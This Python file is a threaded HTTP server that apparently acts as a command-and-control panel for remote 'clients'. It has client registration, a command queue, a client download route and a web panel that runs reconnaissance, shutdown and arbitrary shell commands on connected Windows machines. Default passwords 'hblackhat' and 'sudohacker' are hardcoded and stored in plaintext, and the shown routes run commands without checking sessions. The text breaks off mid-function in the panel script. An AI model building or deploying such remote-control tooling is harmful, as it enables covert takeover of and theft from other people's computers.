# server.py - Enhanced Version with Ultra Instant Features
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    """Multi-threaded HTTP server for handling concurrent connections"""
    daemon_threads = True
    allow_reuse_address = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    
    # ⚡ INSTANT PASSWORD SYSTEM
    PASSWORD_FILE = "passwords.json"
    DEFAULT_PASSWORDS = {
        "user_password": "hblackhat",
        "admin_password": "sudohacker"
    }
    
    def load_passwords(self):
        """INSTANT password loading"""
        try:
            if os.path.exists(self.PASSWORD_FILE):
                with open(self.PASSWORD_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return self.DEFAULT_PASSWORDS.copy()
    
    def get_password_hash(self, password_type):
        """INSTANT hash generation"""
        passwords = self.load_passwords()
        password = passwords.get(password_type, "")
        return hashlib.sha256(password.encode()).hexdigest()
    
    PASSWORD_HASH = property(lambda self: self.get_password_hash("user_password"))
    ADMIN_PASSWORD_HASH = property(lambda self: self.get_password_hash("admin_password"))
    
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 15
    BLOCK_TIME = 15  # ⚡ INSTANT BLOCK
    blocked_ips = set()
    
    def init_database(self):
        """INSTANT database initialization"""
        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
        self.conn.execute('PRAGMA journal_mode=WAL')  # ⚡ FASTER DATABASE
        self.cursor = self.conn.cursor()
        
        # ⚡ INSTANT TABLES CREATION
        tables = [
            '''CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                response TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )''',
            '''CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS password_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                changed_by TEXT,
                password_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )'''
        ]
        
        for table in tables:
            try:
                self.cursor.execute(table)
            except:
                pass
        self.conn.commit()
    
    def log_security_event(self, action):
        """INSTANT security logging"""
        try:
            self.cursor.execute(
                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                (self.client_address[0], action)
            )
            self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """INSTANT IP check"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """INSTANT IP blocking"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🚫 INSTANT BLOCK: {ip}")
    
    def check_security(self):
        """INSTANT security check"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        # ⚡ INSTANT RATE LIMITING
        current_time = time.time()
        if hasattr(self, 'last_request_time'):
            if current_time - self.last_request_time < 0.01:  # ⚡ 10ms RATE LIMIT
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = current_time
        return True
    
    def log_message(self, format, *args):
        """Disable verbose logs for speed"""
        pass
    
    def do_GET(self):
        """INSTANT GET request handling"""
        if not self.check_security():
            return
            
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            
            # ⚡ INSTANT ROUTING - إزالة المسارات المتعلقة بالويب
            routes = {
                '/': self.send_login_page,
                '/admin-auth': self.send_admin_auth_page,
                '/control': self.send_control_panel,
                '/sessions': self.send_sessions_list,
                '/commands': self.handle_get_commands,
                '/result': self.handle_get_result,
                '/download-client': self.download_python_client,
                '/download-python-client': self.download_python_client,
                '/history': self.send_command_history,
                '/status': self.send_system_status,
                '/settings': self.send_settings_page
            }
            
            handler = routes.get(path, self.send_404_page)
            handler()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        """INSTANT POST request handling"""
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            # ⚡ INSTANT POST ROUTING
            routes = {
                '/login': self.handle_login,
                '/admin-login': self.handle_admin_login,
                '/execute': self.handle_execute_command,
                '/response': self.handle_client_response,
                '/register': self.handle_client_register,
                '/change-password': self.handle_change_password
            }
            
            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
            handler(data)
                
        except Exception as e:
            self.send_json({'error': str(e), 'instant': True})

    def save_passwords(self, passwords):
        """INSTANT password saving"""
        try:
            with open(self.PASSWORD_FILE, 'w') as f:
                json.dump(passwords, f)
            return True
        except:
            return False

    def send_settings_page(self):
        """INSTANT settings page"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Settings - INSTANT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    margin: 0;
                    padding: 20px;
                    min-height: 100vh;
                }
                .container {
                    max-width: 600px;
                    margin: 20px auto;
                    background: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                }
                .header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .logo {
                    font-size: 48px;
                    margin-bottom: 10px;
                }
                .password-form {
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                input, select, button {
                    width: 100%;
                    padding: 12px;
                    margin: 8px 0;
                    border-radius: 6px;
                    border: none;
                    font-size: 16px;
                    transition: all 0.2s ease;
                }
                input, select {
                    background: rgba(255,255,255,0.1);
                    color: white;
                    border: 1px solid rgba(255,255,255,0.2);
                }
                input:focus {
                    outline: none;
                    border-color: #0078d4;
                    background: rgba(255,255,255,0.15);
                }
                button {
                    background: linear-gradient(135deg, #0078d4, #005a9e);
                    color: white;
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .back-btn {
                    background: linear-gradient(135deg, #6c757d, #495057);
                    margin-top: 20px;
                }
                .message {
                    padding: 12px;
                    border-radius: 6px;
                    margin: 10px 0;
                    text-align: center;
                    display: none;
                    font-weight: bold;
                }
                .success {
                    background: rgba(40, 167, 69, 0.2);
                    border: 1px solid #28a745;
                }
                .error {
                    background: rgba(220, 53, 69, 0.2);
                    border: 1px solid #dc3545;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">LOGIN</div>
                    <h2>Security Settings <span class="speed-badge">INSTANT</span></h2>
                    <p>Change Authentication Passwords in Real-Time</p>
                </div>

                <div id="message" class="message"></div>

                <div class="password-form">
                    <h3>Change Level 1 Password</h3>
                    <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
                    <input type="password" id="newPassword1" placeholder="New Level 1 Password">
                    <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
                    <button onclick="changePassword('level1')">Update Level 1 Password</button>
                </div>

                <div class="password-form">
                    <h3>Change Admin Password</h3>
                    <input type="password" id="currentPassword2" placeholder="Current Admin Password">
                    <input type="password" id="newPassword2" placeholder="New Admin Password">
                    <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
                    <button onclick="changePassword('level2')">Update Admin Password</button>
                </div>

                <button class="back-btn" onclick="goBack()">← Back to Control Panel</button>
            </div>

            <script>
                function showMessage(text, type) {
                    const message = document.getElementById('message');
                    message.textContent = text;
                    message.className = 'message ' + type;
                    message.style.display = 'block';
                    setTimeout(() => {
                        message.style.display = 'none';
                    }, 3000);
                }

                async function changePassword(level) {
                    let currentId, newId, confirmId;
                    
                    if (level === 'level1') {
                        currentId = 'currentPassword1';
                        newId = 'newPassword1';
                        confirmId = 'confirmPassword1';
                    } else {
                        currentId = 'currentPassword2';
                        newId = 'newPassword2';
                        confirmId = 'confirmPassword2';
                    }

                    const currentPassword = document.getElementById(currentId).value;
                    const newPassword = document.getElementById(newId).value;
                    const confirmPassword = document.getElementById(confirmId).value;

                    if (!currentPassword || !newPassword || !confirmPassword) {
                        showMessage('Please fill all fields', 'error');
                        return;
                    }

                    if (newPassword !== confirmPassword) {
                        showMessage('New passwords do not match', 'error');
                        return;
                    }

                    if (newPassword.length < 4) {
                        showMessage('Password must be at least 4 characters', 'error');
                        return;
                    }

                    try {
                        const response = await fetch('/change-password', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                level: level,
                                current_password: currentPassword,
                                new_password: newPassword
                            })
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            showMessage('Password updated successfully!', 'success');
                            document.getElementById(currentId).value = '';
                            document.getElementById(newId).value = '';
                            document.getElementById(confirmId).value = '';
                        } else {
                            showMessage(data.error || 'Failed to update password', 'error');
                        }
                    } catch (err) {
                        showMessage('Network error: ' + err, 'error');
                    }
                }

                function goBack() {
                    window.location.href = '/control';
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def handle_change_password(self, data):
        """INSTANT password change"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if not level or not current_password or not new_password:
            self.send_json({'success': False, 'error': 'Missing required fields'})
            return
        
        passwords = self.load_passwords()
        
        if level == 'level1':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['user_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
                return
            
            passwords['user_password'] = new_password
            
        elif level == 'level2':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['admin_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
                return
            
            passwords['admin_password'] = new_password
        
        else:
            self.send_json({'success': False, 'error': 'Invalid password level'})
            return
        
        if self.save_passwords(passwords):
            self.log_security_event(f"Password changed for {level}")
            
            if hasattr(self, 'cursor'):
                self.cursor.execute(
                    'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
                    (self.client_address[0], level)
                )
                self.conn.commit()
            
            self.send_json({'success': True, 'instant': True})
        else:
            self.send_json({'success': False, 'error': 'Failed to save new password'})

    def send_login_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - INSTANT AUTH</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #0078d4;
                    background: rgba(255,255,255,0.15);
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                    display: none;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">LOGIN</div>
                <h2>Enhanced Remote Control <span class="speed-badge">INSTANT</span></h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice">
                    Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password" autocomplete="off">
                <button onclick="login()">Authenticate</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                async function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_admin_auth_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Authentication - INSTANT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #e74c3c;
                }
                button { 
                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #c0392b, #a93226);
                    transform: translateY(-2px);
                }
                .security-level {
                    background: rgba(231, 76, 60, 0.2);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid #e74c3c;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">LOGIN</div>
                <h2>Admin Authentication <span class="speed-badge">INSTANT</span></h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                
                <div class="security-level">
                    HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                </div>
                
                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
                <button onclick="adminLogin()">Admin Authentication</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Unauthorized access will be logged and blocked
                </div>
            </div>
            <script>
                async function adminLogin() {
                    const password = document.getElementById('adminPassword').value;
                    if (!password) {
                        alert('Please enter admin password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/admin-login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Admin authentication failed! Access denied.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') adminLogin();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_login(self, data):
        client_ip = self.client_address[0]
        
        if client_ip in self.failed_attempts:
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                time_diff = time.time() - self.failed_attempts[client_ip]['last_attempt']
                if time_diff < self.BLOCK_TIME:
                    self.send_json({'success': False, 'error': 'Too many failed attempts. Try again later.'})
                    return
                else:
                    del self.failed_attempts[client_ip]
        
        password = data.get('password', '')
        expected_hash = self.get_password_hash("user_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            self.log_security_event("Level 1 authentication successful")
            self.send_json({'success': True, 'instant': True})
        else:
            if client_ip not in self.failed_attempts:
                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            
            self.failed_attempts[client_ip]['count'] += 1
            self.failed_attempts[client_ip]['last_attempt'] = time.time()
            
            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
            
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                self.block_ip(client_ip)
            
            self.send_json({'success': False})
    
    def handle_admin_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("admin_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.log_security_event("Admin authentication successful")
            self.send_json({'success': True, 'instant': True})
        else:
            self.log_security_event("Failed admin authentication")
            self.block_ip(client_ip)
            self.send_json({'success': False})

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Control Panel - INSTANT EXECUTION</title>
            <style>
                :root {
                    --primary: #0078d4;
                    --success: #28a745;
                    --danger: #dc3545;
                    --warning: #ffc107;
                    --dark: #1e1e1e;
                    --darker: #2d2d2d;
                    --light: #f8f9fa;
                }
                
                * { margin: 0; padding: 0; box-sizing: border-box; }
                
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: var(--dark); 
                    color: var(--light); 
                    margin: 0; 
                    padding: 20px;
                    overflow-x: hidden;
                }
                
                .header {
                    background: var(--darker);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .container { 
                    display: grid; 
                    grid-template-columns: 350px 1fr; 
                    gap: 20px; 
                    height: 90vh; 
                }
                
                .sidebar { 
                    background: var(--darker); 
                    padding: 20px; 
                    border-radius: 10px;
                    display: flex;
                    flex-direction: column;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .main { 
                    display: flex; 
                    flex-direction: column;
                    gap: 20px;
                }
                
                .session-item { 
                    background: rgba(255,255,255,0.05); 
                    padding: 15px; 
                    margin: 8px 0; 
                    border-radius: 8px; 
                    cursor: pointer;
                    border: 2px solid transparent;
                    transition: all 0.2s ease;
                    position: relative;
                }
                
                .session-item:hover {
                    background: rgba(255,255,255,0.1);
                    border-color: var(--primary);
                    transform: translateY(-1px);
                }
                
                .session-item.active { 
                    border: 2px solid var(--success);
                    background: rgba(40, 167, 69, 0.1);
                }
                
                .session-item.offline {
                    opacity: 0.6;
                    border-color: var(--danger);
                }
                
                .online-status {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    background: var(--success);
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                }
                
                .online-status.offline {
                    background: var(--danger);
                    animation: none;
                }
                
                .terminal { 
                    background: #000; 
                    color: #00ff00; 
                    padding: 20px; 
                    border-radius: 8px; 
                    font-family: 'Consolas', monospace; 
                    flex: 1; 
                    overflow-y: auto; 
                    white-space: pre-wrap;
                    font-size: 14px;
                    min-height: 400px;
                    border: 1px solid rgba(0,255,0,0.2);
                }
                
                button { 
                    background: var(--primary); 
                    color: white; 
                    border: none; 
                    padding: 12px 16px; 
                    margin: 4px; 
                    border-radius: 6px; 
                    cursor: pointer;
                    transition: all 0.2s ease;
                    font-weight: 500;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                }
                
                button.danger { 
                    background: var(--danger); 
                    border: 1px solid rgba(220,53,69,0.3);
                }
                
                button.success { 
                    background: var(--success); 
                    border: 1px solid rgba(40,167,69,0.3);
                }
                
                button.warning { 
                    background: var(--warning); 
                    color: #000; 
                    border: 1px solid rgba(255,193,7,0.3);
                }
                
                .controls-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 8px;
                    margin: 15px 0;
                }
                
                .command-input { 
                    display: flex; 
                    margin: 15px 0; 
                    gap: 10px;
                }
                
                .command-input input { 
                    flex: 1; 
                    padding: 12px; 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                    border-radius: 6px;
                    font-family: 'Consolas', monospace;
                }
                
                .command-input input:focus {
                    outline: none;
                    border-color: var(--primary);
                    background: rgba(255,255,255,0.15);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 15px 0;
                }
                
                .stat-card {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .multi-control {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .security-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 12px;
                    margin-left: 10px;
                }
                
                .settings-btn {
                    background: linear-gradient(135deg, #17a2b8, #138496) !important;
                    margin-left: 10px;
                    border: 1px solid rgba(23,162,184,0.3) !important;
                }
                
                .speed-indicator {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
                
                .instant-badge {
                    background: linear-gradient(135deg, #dc3545, #c82333);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                    animation: blink 1s infinite;
                }
                
                @keyframes blink {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0.7; }
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
                <div>
                    <button onclick="loadSessions()">Refresh List</button>
                    <button onclick="executeAll('sysinfo')">System Info All</button>
                    <button class="settings-btn" onclick="openSettings()">Security Settings</button>
                    <button class="warning" onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div class="container">
                <div class="sidebar">
                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                        <div style="text-align: center; color: #666; padding: 20px;">
                            Loading clients...
                        </div>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
                            <small>Total Clients</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
                            <small>Active</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
                            <small>Commands</small>
                        </div>
                    </div>
                </div>
                
                <div class="main">
                    <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
                        <h3>Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
                        
                        <div class="multi-control">
                            <strong>Instant Commands <span class="instant-badge">0ms</span>:</strong>
                            <div class="controls-grid">
                                <button onclick="executeCommand('sysinfo')">System Info</button>
                                <button onclick="executeCommand('whoami')">Current User</button>
                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
                                <button onclick="executeCommand('dir')">Files List</button>
                                <button onclick="executeCommand('tasklist')">Active Processes</button>
                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
                                <button onclick="executeCommand('systeminfo')">System Details</button>
                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
                                <button onclick="executeCommand('net user')">Users</button>
                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
                                <button onclick="executeCommand('calc')">Calculator</button>
                                <button onclick="executeCommand('notepad')">Notepad</button>
                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
                                <button onclick="executeCommand('net start')">Active Services</button>
                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
                            </div>
                        </div>
                        
                        <div class="command-input">
                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT 0ms execution)" 
                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
                            <button onclick="executeCustomCommand()">Execute Command</button>
                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
                        </div>
                    </div>
                    
                    <div class="terminal" id="terminal">
    INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
    
    • Select a client from the left panel
    • Commands execute INSTANTLY with no delay
    • Real-time responses in under 10ms
    • All activities are logged for security
    • ULTRA INSTANT mode activated
    
                    </div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let commandCounter = 0;
                let allClients = [];
                
                async function loadSessions() {
                    try {
                        const response = await fetch('/sessions?_t=' + Date.now());
                        const sessions = await response.json();
                        allClients = sessions;
                        updateSessionStats(sessions);
                        const list = document.getElementById('sessionsList');
                        
                        if (sessions.length === 0) {
                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                            return;
                        }
                        
                        list.innerHTML = sessions.map(client => {
                            const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 10000; // ⚡ 10 seconds
                            const isSelected = client.id === currentClientId;
                            const statusClass = isActive ? 'online-status' : 'online-status offline';
                            
                            return `
                                <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
                                     onclick="selectClient('${client.id}')">
                                    <div class="${statusClass}"></div>
                                    <strong style="color: ${isActive ? '#28a745' : '#dc3545'}">${client.computer || client.id}</strong><br>
                                    <small>User: ${client.user || 'Unknown'}</small><br>
                                    <small>OS: ${client.os || 'Unknown'}</small><br>
                                    <small>IP: ${client.ip}</small><br>
                                    <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
                                </div>
                            `;
                        }).join('');
                    } catch (error) {
                        console.error('Error loading sessions:', error);
                    }
                }
                
                function updateSessionStats(sessions) {
                    const total = sessions.length;
                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
                    
                    document.getElementById('totalClients').textContent = total;
                    document.getElementById('activeClients').textContent = active;
                    document.getElementById('commandsSent').textContent = commandCounter;
                    document.getElementById('clientsCount').textContent = total;
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    loadSessions();
                    document.getElementById('currentClient').textContent = clientId;
                    addToTerminal(`Selected client: ${clientId}\\n`);
                }
                
                function executeCommand(command) {
                    if (!currentClientId) {
                        alert('Please select a client first!');
                        return;
                    }
                    executeSingleCommand(currentClientId, command);
                }
                
                async function executeSingleCommand(clientId, command) {
                    commandCounter++;
                    const startTime = Date.now();
